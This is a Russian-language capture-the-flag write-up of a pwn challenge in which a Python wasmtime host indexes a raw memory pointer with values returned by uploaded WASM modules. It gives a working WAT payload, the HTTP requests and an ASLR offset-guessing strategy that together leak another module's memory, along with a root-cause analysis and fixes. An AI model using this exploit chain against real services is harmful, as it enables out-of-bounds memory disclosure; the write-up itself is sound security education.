# David — технический разбор

**Флаг:** `avito{honey_badger_does_not_check_bounds_cf9ff3558ae0277f}`
**Класс:** Pwn / Python / WebAssembly

## Краткое техническое резюме

Python host использует `wasmtime.Memory.data_ptr()` и индексирует raw pointer значением, возвращённым
загруженным пользователем WASM-модулем. Отсутствие bounds check создаёт OOB read за пределами WASM
linear memory. Контролируемый экспорт `best_move() -> i64` адресует память соседнего экземпляра
модуля, где в `fen_buf` находится флаг. Относительное расположение крупных memory mappings позволяет
обойти ASLR перебором ограниченного набора offsets.

---

## 1. Контекст и цель

Необходимо извлечь секрет из linear memory штатного WASM-модуля. Основная attack surface находится
на trust boundary между недоверенным WASM-кодом и Python host API.

Доступен сервис `https://goliath-wmm0wh1s.avitoctf.ru/` — launcher с
reCAPTCHA, который создаёт персональный Docker container и возвращает его address. Archive исходников
[`../goliath/goliath_c8c718c.zip`](../goliath/goliath_c8c718c.zip) содержит `Dockerfile`, host
integration `mcu-max.py`, engine
`mcu-max.c/.h`, wrapper `mcu-max-wrap.c`, compiled `mcu-max.wasm` и frontend.

Цель — прочитать флаг из linear memory экземпляра `BEE_PLAYER`.

## 2. Reconnaissance и attack surface

Сервис реализован на FastAPI и использует `wasmtime==45.0.0` для исполнения WASM-модулей. Критичный
код находится в классе `Player` файла `mcu-max.py`:

```python
class Player:
    def __init__(self, engine, module):
        ...
        self.__memory = self.__exports["memory"].data_ptr(self.__store)   # mcu-max.py:17
        self.__fen_buffer = self.__exports["fen_buffer"]
        self.__best_move = self.__exports["best_move"]

    def best_move(self, fen: str) -> str:
        data = fen.encode("latin-1") + b"\x00"
        ...
        fen_buffer = self.__fen_buffer(self.__store)
        for i, b in enumerate(data):
            self.__memory[fen_buffer + i] = b        # mcu-max.py:30 — unsafe write via raw pointer
        ptr = self.__best_move(self.__store)
        ...
        move = bytearray()
        while b := self.__memory[ptr + len(move)]:    # mcu-max.py:37 — unsafe read via raw pointer
            move.append(b)
        return move.decode("latin-1", errors="replace")
```

Код выполняет следующие операции:

- `self.__memory = ...data_ptr(...)` получает raw host pointer на начало WASM linear memory.

- `self.__memory[fen_buffer + i] = b` записывает FEN bytes в linear memory с offset, возвращённым
  guest export `fen_buffer`.
- `ptr = self.__best_move(...)` получает смещение из guest export.
- `while b := self.__memory[ptr + len(move)]` читает NUL-terminated sequence без проверки, что
  `ptr` находится в пределах данного memory object.

Сервис содержит два экземпляра `Player`:

- `BEE_PLAYER` создаётся при старте server из штатного `mcu-max.wasm`
  (`mcu-max.py:44`). Именно в его памяти лежит флаг.
- `BADGER_PLAYER` пересоздаётся из user-supplied bytes при каждом
  `POST /api/upload`:

  ```python
  @API.post("/upload")
  async def upload(file: UploadFile):
      wasm_bytes = await file.read()
      module = Module(ENGINE, wasm_bytes)     # mcu-max.py:54 — validation WASM format
      player = Player(ENGINE, module)         # export signatures are not validated
      BADGER_PLAYER = player
  ```

Endpoint `/api/best-move?fen=...` (`mcu-max.py:63-81`) выбирает player по второму полю FEN:
`'w'` → `BEE_PLAYER`, `'b'` → `BADGER_PLAYER`. Значение `b` направляет request в user-supplied module.

`mcu-max-wrap.c` определяет расположение флага:

```c
static char fen_buf[256] = FLAG;
static char move_buf[8];             // mcu-max-wrap.c:4

char *fen_buffer(void) { return fen_buf; }         // mcu-max-wrap.c:7
char *best_move(void) {
    mcumax_set_fen_position(fen_buf);
    mcumax_move move = mcumax_search_best_move(1000000, 30);
    if (move.from == INVALID || move.to == INVALID) return 0;
    char *p = move_buf;
    p = format_square(p, move.from); p = format_square(p, move.to); *p = 0;
    return move_buf;
}
```

`Makefile:1` содержит `FLAG := "avito{1111111111111111111111111111}"` и при сборке подставляет его в
`fen_buf` через `-DFLAG=$(FLAG)`. Deployed `mcu-max.wasm` содержит production flag вместо test fixture.
`Dockerfile` также создаёт `/flag` с mode `0400`, но David exploit target — compiled `fen_buf`; чтение
host file рассматривается в [разборе Goliath](../goliath/goliath_writeup.md).

`wasm2wat mcu-max.wasm` подтверждает memory layout `BEE_PLAYER`: `(memory 2)` соответствует 128 KiB,
а data segment расположен по
фиксированному адресу — `(data $.data (i32.const 1072) "avito{111...}\00...")`. То есть `fen_buf`
начинается по offset **1072 = 0x430** внутри memory `BEE_PLAYER`.

## 3. Анализ и проверка гипотез

**Unchecked raw pointer access.** `self.__memory` — результат `data_ptr(store)`, то есть raw pointer
`ctypes.POINTER(c_uint8)`, а не bounds-checked методы
`Memory.read()`/`write()` из той же библиотеки wasmtime.

Методы `Memory.read()`/`Memory.write()` проверяют границы linear memory. Индексация результата
`data_ptr()` выполняется как host pointer arithmetic и не использует `data_len`, что создаёт
межобъектный OOB read.

Local validation использует минимальный WASM module, где `best_move()` возвращает offset `0x10000` за
пределами declared memory. Dereference завершается `SIGBUS`, а не Python exception, что подтверждает
direct host pointer access.

**Export signature mismatch.** `/api/upload` не проверяет export signatures. `best_move()` можно
объявить возвращающим `i64`
(64-битное целое), а не `i32` (32-битное), как в оригинале.

Экспорт с return type `i64` предоставляет 64-битное смещение в адресном пространстве процесса.
Python host не валидирует сигнатуру экспорта; поведение подтверждено локально с `wasmtime-py`.

**Прямое чтение через `BEE_PLAYER`.** Вариант с `active='w'` неприменим: `best_move()` всегда возвращает
pointer на отдельный 8-байтовый `move_buf` либо `0`, но не `fen_buf`. Чтение `fen_buf` требует
user-supplied module с контролируемым return value `best_move()`.

**Межобъектный OOB.** `BADGER_PLAYER` и `BEE_PLAYER` используют разные memory mappings. Для чтения
`fen_buf` необходимо определить их относительное расположение.

Wasmtime резервирует для каждой 32-bit linear memory virtual address range размером около 4 GiB с
guard pages. При отсутствии промежуточных large mappings два instances получают предсказуемое
relative placement, хотя absolute addresses рандомизируются ASLR.

На macOS relative offsets между mappings нестабильны (`0x104000000`, `0x846000000` и другие), поэтому
калибровка выполняется в target-compatible Linux environment (`debian:bookworm`).

В минимальном Linux harness десять independent processes дали
`badger_base − bee_base == −0x104000000`. Этот result подтверждает стабильный relative offset в
отсутствие промежуточных allocations.

Candidate read offset относительно `BADGER_PLAYER` равен
`0x104000000 + 0x430 = 0x104000430`.

### 3.1. Калибровка relative offset

Статическая константа `0x104000430` нестабильна в окружении uvicorn/FastAPI. Анализ идентично собранных
образов показал:

- Minimal harness не воспроизводит allocations uvicorn/FastAPI между созданием `BEE_PLAYER` при
  startup и `BADGER_PLAYER` при первом `POST /api/upload`. Worker pools и allocator arenas добавляют
  intermediate reservations и изменяют relative offset.

- **Relative-offset model** по measurements в target environment:

  ```
  bee_base − badger_base  =  0x104000000  +  k · 0x04000000 ,   k ∈ {0, 1, 2}
  распределение ≈  k=0 → 45 %,  k=1 → 7 %,  k=2 → 48 %
  ```

  Дополнительный stride равен **`0x04000000` = 64 MiB**. Получаются три candidate offsets:
  `OFFSET(k) = 0x104000000 + k·0x04000000 + 0x430`.

- Перебор `N·0x104000000 + 0x430` покрывает только `k=0` и пропускает offsets с дополнительным
  stride `0x04000000`.

- В Docker Desktop/QEMU/Rosetta offset стабильно равен `0x104000000` (`k=0`), поскольку thread startup
  сериализуется. Native amd64 Linux допускает variance `k∈{0,1,2}`.

- **Cgroup memory limit.** `docker run --memory=256m` не изменяет layout: 4-GiB `PROT_NONE`
  reservation занимает virtual address space, но не resident memory.

Invalid candidate вызывает `SIGSEGV`, который нельзя обработать в Python. `restart: unless-stopped`
перезапускает container с новым `k`; `solve_david.py` приоритизирует `k=0` и `k=2`, периодически
проверяет `k=1` и оставляет safety-net candidates `k=3..8`. По наблюдаемому distribution `k=0` и
`k=2` покрывают около 93% instances.

Вариант из [`../goliath/solve_goliath.py`](../goliath/solve_goliath.py) передаёт адрес динамически
через FEN, что позволяет изменять
offset без повторной загрузки WASM-модуля.

## 4. Корневая причина

CWE-125 возникает на unsafe Python↔WASM trust boundary:

1. `mcu-max.py:17,30,37` — host integration читает/пишет память модуля через raw `data_ptr()`, а не через
   `Memory.read()/write()` с bounds checks.
2. `mcu-max.py:50-60` (`POST /api/upload`) instantiates user-supplied module без validation export
   names и types. `best_move()` может возвращать `i64` вместо expected `i32`.
3. Сочетание (1) и (2) преобразует controlled 64-bit return value в host-memory read, включая memory
   другого module instance (`BEE_PLAYER`), где
   в `fen_buf` (`mcu-max-wrap.c:3`) лежит флаг.
4. Межмодульное чтение возможно, поскольку wasmtime размещает linear memories как статические
   ~4 ГиБ `mmap`-резервации; при отсутствии крупных аллокаций между стартом и первой загрузкой ОС
   размещает их на детерминированной решётке, превращая «случайный» ASLR-адрес в предсказуемое
   относительное смещение.

## 5. Эксплуатация

**Шаг 0.** Открыть `https://goliath-wmm0wh1s.avitoctf.ru/`, пройти reCAPTCHA и получить URL ephemeral
instance через `Launch Instance`. Этот launcher step не автоматизируется из-за server-side
validation Google reCAPTCHA v2.

**Шаг 1. Сформировать WASM payload** (`solve_david.py`, WAT representation):

```wat
(module
  (memory (export "memory") 1)
  (func (export "fen_buffer") (result i32)
    i32.const 0)
  (func (export "best_move") (result i64)
    i64.const 0x104000430))
```

В примере указан candidate для `k=0`; solver пересобирает constant для каждого значения из
`K_SWEEP`.

**Шаг 2. Загрузить модуль:**

```
POST /api/upload   (multipart file=badger.wasm)
-> {"status":"ok","bytes":83}
```

**Шаг 3. Вызвать endpoint с active color `'b'`** для выбора `BADGER_PLAYER`:

```
GET /api/best-move?fen=x%20b
-> {"best_move":"avito{...}"}
```

`fields[1] == 'b'` — единственное требование к строке `fen`. Она передаётся в user-supplied module:
`fen_buffer()` возвращает offset `0` внутри guest memory, а `best_move()` — controlled OOB offset.
Python читает NUL-terminated bytes и возвращает их в JSON field `best_move`.

**Шаг 4. Retry после process crash.** При invalid candidate `restart: unless-stopped` перезапускает
container; после readiness probe повторяются шаги 2–3 с другим `k`. Retry logic реализована в
`solve_david.py`.

Запуск solver:

```
uv run python david/solve_david.py --url https://<INSTANCE_HOST>/
```

## 6. Флаг

```
avito{honey_badger_does_not_check_bounds_cf9ff3558ae0277f}
```

Локальный test fixture (`Makefile:1`, `avito{1111111111111111111111111111}`) используется только
для проверки exploit chain и не является итоговым флагом.

## 7. Выводы и рекомендации

Уязвимость возникает из-за доверия к guest-controlled pointer на границе WASM host/guest.

- **Bounds enforcement.** Host code должен использовать `Memory.read(store, ptr, ptr+len)` и
  `Memory.write(...)`, проверять `offset + length <= data_len` и не индексировать raw `data_ptr()`
  guest-controlled значениями.
- **ABI validation.** Перед instantiation следует проверять names и signatures exports;
  `best_move` должен возвращать `i32`, а `fen_buffer` — валидный in-bounds offset.
- **Trust boundary.** WASM обеспечивает memory isolation только при корректной host integration.
  Guest return values являются untrusted data и не могут использоваться как unchecked pointers.
- **Trust-boundary audit.** Любое guest-controlled число, используемое host code как index,
  pointer или offset, требует явной проверки диапазона. Крупные одинаковые WASM reservations могут
  иметь предсказуемое относительное расположение даже при ASLR, поэтому межобъектные OOB необходимо
  рассматривать отдельно.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- [`solve_david.py`](solve_david.py) — solver: собирает WASM payload через `wat2wasm`, загружает его,
  вызывает `/api/best-move?fen=x b` и перебирает candidate offsets между process restarts.
- [`../goliath/goliath_c8c718c.zip`](../goliath/goliath_c8c718c.zip) — archive исходников общего
  сервиса David/Goliath:
  `mcu-max.py`, `mcu-max-wrap.c`, `mcu-max.c/.h`, `mcu-max.wasm`, `Makefile`, `Dockerfile`,
  `docker-compose.yml` и frontend.
- [`FLAG.txt`](FLAG.txt) — извлечённый флаг.
- [Разбор Goliath](../goliath/goliath_writeup.md) — расширение primitive до arbitrary read/write и
  host filesystem disclosure.

Canonical source archive находится в `../goliath/goliath_c8c718c.zip`; session-local duplicate в
directory `david/` не входит в version-controlled набор.
